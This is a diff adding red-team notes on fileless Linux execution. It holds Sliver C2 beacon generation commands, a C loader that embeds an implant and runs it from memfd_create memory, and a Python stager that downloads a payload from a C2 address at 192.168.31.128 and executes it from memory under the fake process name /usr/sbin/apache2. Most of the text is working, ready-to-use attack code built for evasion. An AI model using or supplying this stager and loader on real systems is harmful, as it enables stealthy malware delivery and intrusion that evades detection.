@@ -1,0 +1,144 @@
+# First
+## Thanks
+- `https://towardsdev.com/memfd-create-fileless-execution-linux-elf-in-memory-28422d6bcbef`
+## Start
+- `generate beacon --http 192.168.31.128 -N First --os linux`
+- `xxd -i ../sliver/first > ghost_bytes.h`
+- loader.c
+```
+// loader.c — Execute an ELF binary entirely from anonymous memory
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+
+// Our embedded binary
+#include "ghost_bytes.h"
+
+int main(int argc, char *argv[]) {
+    // Check if user wants the /proc/self/fd method
+    int use_procfd = (argc > 1 && strcmp(argv[1], "--procfd") == 0);
+
+    printf("[*] Loader started. Creating anonymous memory file...\n");
+
+   
+    // STEP A: Create an anonymous file in memory
+    // memfd_create() returns an fd backed by anonymous memory.
+    // The name "ghost" is for debugging only — it appears in
+    // /proc/<pid>/fd/ as "memfd:ghost" but is NOT a real path.
+    //
+    // We use MFD_CLOEXEC so this fd is automatically closed
+    // after exec, preventing child processes from inheriting
+    // (and potentially tampering with) the memory file.
+    int fd = memfd_create("ghost", MFD_CLOEXEC);
+    if (fd == -1) {
+        perror("memfd_create failed");
+        return 1;
+    }
+    printf("[+] Anonymous fd created: %d\n", fd);
+
+    // STEP B: Write the ELF binary into the memory file
+    // This is like `write()` to any file, except the
+    // backing store is anonymous memory, not a disk block.
+    ssize_t written = write(fd, ___sliver_first, ___sliver_first_len);
+    if (written != (ssize_t)___sliver_first_len) {
+        perror("write failed");
+        close(fd);
+        return 1;
+    }
+    printf("[+] Wrote %zd bytes into anonymous memory fd\n", written);
+
+    // STEP C: Execute the in-memory binary
+    char *new_argv[] = { "ghost", NULL };
+    char *new_envp[] = { NULL };
+
+    if (use_procfd) {
+        // METHOD 2: execve() via /proc/self/fd/<N>
+        //
+        // This is actually what many real-world tools use,
+        // including some malware samples. The kernel resolves
+        // /proc/self/fd/N to the underlying file object —
+        // our memfd — and executes it.
+        //
+        // This approach works even in environments where
+        // fexecve() isn't available (older glibc, musl, etc.)
+        char fd_path[64];
+        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
+
+        printf("[*] Executing via execve(\"%s\")...\n\n", fd_path);
+        execve(fd_path, new_argv, new_envp);
+    } else {
+        // METHOD 1: fexecve() — the "clean" API
+        //
+        // fexecve() takes a file descriptor directly instead
+        // of a path. Under the hood, on Linux, glibc's
+        // fexecve() actually calls execve("/proc/self/fd/N")
+        // anyway — but using fexecve() is more portable and
+        // expresses intent more clearly.
+        printf("[*] Executing via fexecve(fd=%d)...\n\n", fd);
+        fexecve(fd, new_argv, new_envp);
+    }
+
+    // If we reach here, execution failed
+    perror("exec failed");
+    close(fd);
+    return 1;
+}
+
+```
+
+- `gcc -o loader loader.c`
+
+# Second
+- `generate beacon --http 192.168.31.128 -N Second --os linux`
+# Script
+```
+#!/usr/bin/env python3
+import os
+import urllib.request
+import sys
+
+def main():
+    c2_url = "http://192.168.31.128:8080/second"
+    
+    print("[*] Downloading payload into memory...")
+    try:
+        with urllib.request.urlopen(c2_url) as response:
+            payload = response.read()
+    except Exception as e:
+        print(f"[-] Download failed: {e}")
+        sys.exit(1)
+
+    print("[*] Creating anonymous memory file...")
+    try:
+        fd = os.memfd_create("systemd-service", flags=os.MFD_CLOEXEC)
+    except AttributeError:
+        print("[-] os.memfd_create is not supported on this Python/OS version.")
+        sys.exit(1)
+
+    os.write(fd, payload)
+    os.lseek(fd, 0, os.SEEK_SET)
+    
+    fake_process_name = "/usr/sbin/apache2"
+    argv = [fake_process_name]
+    env = os.environ
+
+    print("[+] Executing payload via fexecve...")
+    try:
+        # os.fexecve(fd, argv, env)
+        fd_path = f"/proc/self/fd/{fd}"
+        os.execve(fd_path, argv, env)
+    except Exception as e:
+        print(f"[-] Execution failed: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+```
+
+- `https://gist.github.com/zznop/0117c24164ee715e750150633c7c1782`
+- `https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html`
+- `https://mohitdabas.in/blog/linux-maldev-fileless-execution-memfd-create`
+- `https://www.reddit.com/r/redteamsec/comments/1ujq86q/sliver_stagers/`
